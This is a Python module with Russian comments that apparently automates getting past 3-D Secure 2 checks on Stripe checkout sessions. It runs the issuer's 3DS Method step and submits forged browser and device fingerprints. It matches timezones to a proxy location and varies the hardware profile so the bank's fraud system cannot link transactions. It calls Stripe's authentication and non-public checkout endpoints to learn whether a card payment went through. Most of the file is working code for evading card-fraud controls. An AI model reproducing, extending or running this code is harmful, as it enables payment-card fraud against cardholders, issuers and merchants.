# language: Python 3.12+, file: frictionless_engine.py, target: Windows 11
# Система 2: Frictionless 3DS2 Telemetry & 3DS Method Emulation Engine.
# Автоматизация сбора отпечатков через 3DS-Method iframe и перевод транзакции в Frictionless (transStatus = Y).
import base64
import json
import random
import re
from typing import Any

from curl_cffi.requests import AsyncSession

import config
import pusto_logger as _log


# Таймзоны по странам для полной синхронизации с биллингом и резидентным прокси
GEO_TIMEZONES = {
    "US": [240, 300, 360, 420, 480],  # EDT/EST (-4, -5), CDT/CST (-6), MDT/MST (-7), PDT/PST (-8)
    "CA": [240, 300, 360, 420, 480],
    "GB": [0, -60],
    "DE": [-60, -120],
    "FR": [-60, -120],
    "NL": [-60, -120],
    "AU": [-600, -660],
    "SG": [-480],
    "JP": [-540],
    "BR": [180],
    "MX": [360, 420],
}

COMMON_SCREEN_RESOLUTIONS = [
    (1920, 1080),
    (2560, 1440),
    (1536, 864),
    (1440, 900),
    (1366, 768),
]


def build_three_ds_method_payload(server_trans_id: str, notification_url: str) -> str:
    """Генерирует base64url-encoded threeDSMethodData по EMVCo 3DS 2.x.

    Раньше docstring называл целевым стандартом «EMVCo 3DS 2.0», тогда как действующая линия
    спецификации — 2.3.1 (EMVCo SB n° 279; Stripe принимает version 2.3.0 / 2.3.1 с релиза
    clover/2026-01-28). Само поле threeDSMethodData версии не несёт — оно уходит в AReq, который
    собирает Stripe, — поэтому здесь честное «2.x», а фактическая версия фиксируется
    в three_ds_protocol_info() и в диагностике (аудит 2026-09, E-29 / E-33).
    """
    data = {
        "threeDSServerTransID": server_trans_id,
        "threeDSMethodNotificationURL": notification_url
    }
    dumped = json.dumps(data, separators=(",", ":"))
    return base64.urlsafe_b64encode(dumped.encode()).decode().rstrip("=")


def three_ds_protocol_info() -> dict[str, Any]:
    """Что контур знает о версии протокола 3DS: цель, поддержанные значения, кто выбирает.

    Интент создаёт мерчант, поэтому версию выставляем не мы — но до этой правки она не
    отражалась вообще нигде (аудит 2026-09, E-33). Возвращаем словарь, который кладётся
    в результаты и в диагностику гейтов.
    """
    return {
        "target": config.THREE_DS_VERSION_TARGET,
        "supported": list(config.THREE_DS_VERSIONS_SUPPORTED),
        "selected_by": "merchant intent",
    }


def build_browser_telemetry(country_code: str = "US", user_agent: str | None = None,
                            method_executed: bool = False) -> dict[str, Any]:
    """Генерирует реалистичный и согласованный профиль браузера для 3DS2.

    method_executed=True только если 3DS Method реально прошёл: от этого зависит
    threeDSCompInd (Y/U). Раньше признак подставлялся авансом (аудит 2026-09, E-08).
    """
    cc = (country_code or "US").upper()
    tz_pool = GEO_TIMEZONES.get(cc, GEO_TIMEZONES["US"])
    tz_offset = random.choice(tz_pool)
    
    width, height = random.choice(COMMON_SCREEN_RESOLUTIONS)
    ua = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
    
    lang = "en-US"
    if cc in ("DE", "AT"):
        lang = "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"
    elif cc in ("FR", "BE"):
        lang = "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
    elif cc in ("ES", "MX"):
        lang = "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"
    else:
        lang = "en-US,en;q=0.9"

    return {
        # threeDSCompInd выдаётся авансом только когда Method реально исполнен:
        # «Y» — завершён, «U» — неизвестно. Раньше всегда стояло «Y», даже если Method
        # не запускался (аудит 2026-09, E-08), и ACS получал ложное подтверждение.
        "threeDSCompInd": "Y" if method_executed else "U",
        "fingerprintAttempted": bool(method_executed),
        "challengeWindowSize": "05",
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": lang.split(",")[0],
        "browserColorDepth": "24",
        "browserScreenHeight": str(height),
        "browserScreenWidth": str(width),
        "browserTZ": str(tz_offset),
        "browserUserAgent": ua,
        "browserAcceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        # Совместимость с числовыми / не-EMVCo ключами
        "timeZoneOffset": tz_offset,
        "language": lang.split(",")[0],
        "colorDepth": 24,
        "screenHeight": height,
        "screenWidth": width,
        "userAgent": ua,
        "javaEnabled": False,
        "javascriptEnabled": True,
        "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    }


def snapshot_cookies(session: Any) -> dict:
    """Снимок cookie-jar без падения на CookieConflict.

    Живой случай: ACS эмитента (Arcot) и hCaptcha ставят ОДИНАКОВОЕ имя __cf_bm на разных доменах
    (.arcot.com и .hcaptcha.com), и тогда dict(session.cookies) бросает CookieConflict — ровно после
    успешного 3DS-Method (HTTP 200). Из-за этого обход 3DS обрывался и вердикт всегда съезжал в
    «3DS_CHALLENGE» (проверено 2026-09-13: execute_3ds_method отдавал success=False сразу после 200).

    Поэтому имя квалифицируем доменом только при настоящем конфликте: обычно ключи остаются чистыми,
    а дубликаты различимы и не теряются.
    """
    jar = getattr(getattr(session, "cookies", None), "jar", None)
    if jar is None:
        return {}
    out: dict = {}
    for c in jar:
        name = getattr(c, "name", "")
        if not name:
            continue
        value = getattr(c, "value", "")
        if name in out and out[name] != value:
            out[f"{name}@{getattr(c, 'domain', '') or ''}"] = value
        else:
            out[name] = value
    return out

async def execute_3ds_method(
    session: AsyncSession,
    method_url: str,
    server_trans_id: str,
    notification_url: str = "",
) -> dict[str, Any]:
    """Исполняет 3DS-Method (скрытый iframe фингерпринтинга ACS эмитента).

    notification_url по умолчанию — живой маршрут Stripe (/3d_secure_2/hosted/complete).
    Прежний /3ds2/fingerprint/complete отдаёт 404: цепочка method -> notification не замыкалась
    (аудит 2026-09, H-30).
    """
    notification_url = notification_url or config.THREE_DS_METHOD_NOTIFICATION_URL
    b64_data = build_three_ds_method_payload(server_trans_id, notification_url)
    
    try:
        r = await session.post(
            method_url,
            data={"threeDSMethodData": b64_data},
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": "https://checkout.stripe.com/",
            },
            timeout=10
        )
        _log.log_http("POST", method_url, r.status_code)
        html = r.text
        
        # Парсим скрытые формы и эндпоинты сбора данных ACS (например Entersekt / Cardinal)
        device_fp_url = None
        if "devicefingerprint" in html:
            m = re.search(r'submitDataAndForm\(["\'](https://[^"\']+/devicefingerprint[^"\']*)["\']\)', html)
            if not m:
                m = re.search(r'action=["\'](https://[^"\']+/devicefingerprint[^"\']*)["\']', html)
            if not m:
                m = re.search(r'["\'](https://[^"\']+/devicefingerprint[^"\']*)["\']', html)
            if m:
                device_fp_url = m.group(1)

        # Если ACS требует прямой сабмит собранных фингерпринтов
        if device_fp_url and r.status_code == 200:
            import hashlib
            h = hashlib.sha256(server_trans_id.encode()).hexdigest()
            canvas_hash = h[:16]
            gpus = [
                "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
                "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 4070 Direct3D11 vs_5_0 ps_5_0)",
                "Google Inc. (Intel)~ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
                "Google Inc. (AMD)~ANGLE (AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0)",
            ]
            gpu_choice = gpus[int(h[16:18], 16) % len(gpus)]
            # железо тоже варьируется от транзакции к транзакции: константный
            # профиль (8 ядер / 16 ГБ) на всех GPU-вариантах — готовый
            # корреляционный якорь для ACS (хвост AUD-021)
            cores = (4, 8, 12, 16)
            mems = (8, 16, 32)
            fp_payload = {
                "threeDSServerTransID": server_trans_id,
                "deviceFpResult": json.dumps({
                    "canvas": canvas_hash,
                    "webgl": gpu_choice,
                    "platform": "Win32",
                    "hardwareConcurrency": cores[int(h[18:20], 16) % len(cores)],
                    "deviceMemory": mems[int(h[20:22], 16) % len(mems)]
                })
            }
            await session.post(
                device_fp_url,
                data=fp_payload,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=8
            )

        return {
            "success": r.status_code == 200,
            "status_code": r.status_code,
            "cookies": snapshot_cookies(session),
            "server_trans_id": server_trans_id,
            "three_ds_protocol": three_ds_protocol_info(),
        }
    except Exception as e:
        _log.log_error("frictionless_engine", f"3ds_method error on {method_url}", e)
        return {"success": False, "error": str(e), "server_trans_id": server_trans_id,
                "three_ds_protocol": three_ds_protocol_info()}


async def _poll_checkout_session(session, pk: str, cs: str) -> dict:
    """Читает состояние сессии чекаута. Возвращает {} при любой неудаче (не бросает).

    Живой замер 2026-09-12: именно этот опрос отличает «аутентификация прошла» от «оплачено»,
    поэтому его результат отдаётся наружу как evidence, а не остаётся внутренним делом.
    """
    if not (session and pk and cs):
        return {}
    try:
        pp_url = f"https://api.stripe.com/v1/payment_pages/{cs}"
        r_poll = await session.get(
            pp_url,
            params={"key": pk},
            headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
            timeout=10,
        )
        try:
            import gate_client as _gc
            _gc.flag_internal_endpoint(r_poll, pp_url)
        except Exception:
            pass
        return r_poll.json() or {}
    except Exception:
        return {}


def _evidence_from_poll(poll_json: dict) -> str:
    """Какое подтверждение оплаты дал Stripe: session_complete / pi_succeeded / pi_processing / ""."""
    if not poll_json:
        return ""
    pi = poll_json.get("payment_intent") or {}
    pi_status = str(pi.get("status") or "")
    # Оплату подтверждает ТОЛЬКО payment_status=paid или PI=succeeded. Сессия может быть
    # status=complete и при этом unpaid — это и есть провал верификации способа оплаты
    # («Не удалось верифицировать способ оплаты»), а не оплата (живой случай 2026-09-12).
    if poll_json.get("payment_status") == "paid":
        return "session_paid"
    if poll_json.get("payment_status") == "no_payment_required":
        return "session_no_payment"
    if pi_status == "succeeded":
        return "pi_succeeded"
    if pi_status == "processing":
        return "pi_processing"
    if poll_json.get("status") == "complete":
        return "session_complete_unpaid"
    return ""


async def attempt_frictionless_resolution(
    session: AsyncSession,
    pk: str,
    cs: str,
    sdk_data: dict[str, Any],
    country_code: str = "US"
) -> dict[str, Any]:
    """Полный цикл прохода Frictionless 3DS2 для сессии чекаута:
    1. Исполнение 3DS-Method (если URL предоставлен)
    2. Обогащение телеметрии браузера (browser metadata)
    3. Вызов /v1/3ds2/authenticate или опрос payment_pages на финальный статус
    """
    stripe_js = sdk_data.get("stripe_js") or {}
    method_url = (
        sdk_data.get("three_ds_method_url")
        or stripe_js.get("three_ds_method_url")
        or sdk_data.get("method_url")
        or stripe_js.get("method_url")
    )
    server_trans_id = (
        sdk_data.get("server_transaction_id")
        or stripe_js.get("server_transaction_id")
        or sdk_data.get("three_ds_server_trans_id")
        or stripe_js.get("three_ds_server_trans_id")
        or sdk_data.get("threeDSServerTransID")
    )
    source_id = (
        sdk_data.get("three_d_secure_2_source")
        or stripe_js.get("three_d_secure_2_source")
        or sdk_data.get("source")
        or stripe_js.get("source")
    )
    notification_url = (
        sdk_data.get("three_ds_method_notification_url")
        or stripe_js.get("three_ds_method_notification_url")
        or sdk_data.get("notification_url")
        or config.THREE_DS_METHOD_NOTIFICATION_URL
    )

    # 1. Запуск 3DS Method, если он есть
    method_res = {"success": True}
    if method_url and server_trans_id:
        method_res = await execute_3ds_method(session, method_url, server_trans_id, notification_url=notification_url)

    # 2. Формирование согласованной телеметрии. Признак исполнения Method берём из его
    #    же результата, а не подставляем авансом (аудит 2026-09, E-08).
    method_ok = bool(method_url and server_trans_id and method_res.get("success"))
    browser_data = build_browser_telemetry(country_code=country_code, method_executed=method_ok)

    # 3. Вызов /v1/3ds2/authenticate (если доступен source)
    auth_res = {}
    if source_id:
        try:
            r = await session.post(
                "https://api.stripe.com/v1/3ds2/authenticate",
                data={
                    "key": pk,
                    "source": source_id,
                    "browser": json.dumps(browser_data)
                },
                headers={
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                    "Accept": "application/json"
                },
                timeout=12
            )
            auth_res = r.json()
        except Exception as e:
            auth_res = {"error": str(e)}

    # Анализируем результат аутентификации
    ares = auth_res.get("ares") or {}
    trans_status = str(auth_res.get("transStatus") or ares.get("transStatus") or "").upper()
    state = str(auth_res.get("state") or auth_res.get("status") or "").lower()

    if trans_status == "Y" or state in ("succeeded", "approved"):
        # Аутентификация прошла — но это ещё НЕ оплата. Проверяем, подтвердил ли Stripe деньги:
        # сессия complete/paid или PI succeeded. Раньше здесь сразу объявлялся APPROVED@PAID, и
        # живой замер 2026-09-12 дал ложную победу при payment_status=unpaid.
        poll_json = await _poll_checkout_session(session, pk, cs)
        evidence = _evidence_from_poll(poll_json) or "auth_only"
        return {
            "outcome": "FRICTIONLESS_PASSED",
            "evidence": evidence,
            "pi_status": "succeeded",
            "detail": ("Frictionless 3DS2 authenticated successfully (transStatus=Y)"
                       + (f"; подтверждение Stripe: {evidence}" if evidence != "auth_only"
                          else "; подтверждения оплаты от Stripe нет")),
            "auth_res": auth_res,
            "method_res": method_res,
            "three_ds_protocol": three_ds_protocol_info(),
        }
    if trans_status == "C" or state in ("challenge_required",) or "acs_url" in str(auth_res):
        return {
            "outcome": "CHALLENGE_REQUIRED",
            "pi_status": "requires_action",
            "detail": "Issuer requires OTP / app challenge (transStatus=C)",
            "auth_res": auth_res,
            "method_res": method_res,
            "three_ds_protocol": three_ds_protocol_info(),
        }

    # 4. Проверка состояния сессии чекаута
    if cs:
        try:
            # Непубличный маршрут Stripe: 404 здесь означает выведенный путь, а не отказ карты
            pp_url = f"https://api.stripe.com/v1/payment_pages/{cs}"
            r_poll = await session.get(
                pp_url,
                params={"key": pk},
                headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
                timeout=10
            )
            # 404 здесь — выведенный маршрут Stripe, а не отказ карты (аудит 2026-09, H-01).
            # Импорт ленивый: gate_client не должен тянуть frictionless на импорте.
            try:
                import gate_client as _gc
                _gc.flag_internal_endpoint(r_poll, pp_url)
            except Exception:
                pass
            poll_json = r_poll.json() or {}
            pi = poll_json.get("payment_intent") or {}
            pi_status = pi.get("status")

            if pi_status in ("succeeded", "processing") or poll_json.get("status") == "complete":
                # evidence: здесь есть подтверждение от Stripe — сессия завершена или PI дошёл
                # до succeeded/processing. Только это и даёт право говорить об оплате.
                if poll_json.get("status") == "complete":
                    evidence = "session_complete"
                elif pi_status == "succeeded":
                    evidence = "pi_succeeded"
                else:
                    evidence = "pi_processing"
                return {
                    "outcome": "FRICTIONLESS_PASSED",
                    "evidence": evidence,
                    "pi_status": pi_status,
                    "detail": f"Frictionless authentication approved ({pi_status})",
                    "auth_res": auth_res,
                    "method_res": method_res,
                    "three_ds_protocol": three_ds_protocol_info(),
                }
            elif pi_status == "requires_action":
                na = pi.get("next_action") or {}
                sdk = na.get("use_stripe_sdk") or {}
                if sdk.get("type") == "stripe_3ds2_challenge" or "acs_url" in str(sdk):
                    return {
                        "outcome": "CHALLENGE_REQUIRED",
                        "pi_status": pi_status,
                        "detail": "Issuer requires OTP / app challenge",
                        "auth_res": auth_res,
                        "method_res": method_res,
                        "three_ds_protocol": three_ds_protocol_info(),
                    }
        except Exception:
            pass

    return {
        "outcome": "IN_PROGRESS",
        "method_res": method_res,
        "auth_res": auth_res,
        "three_ds_protocol": three_ds_protocol_info(),
    }
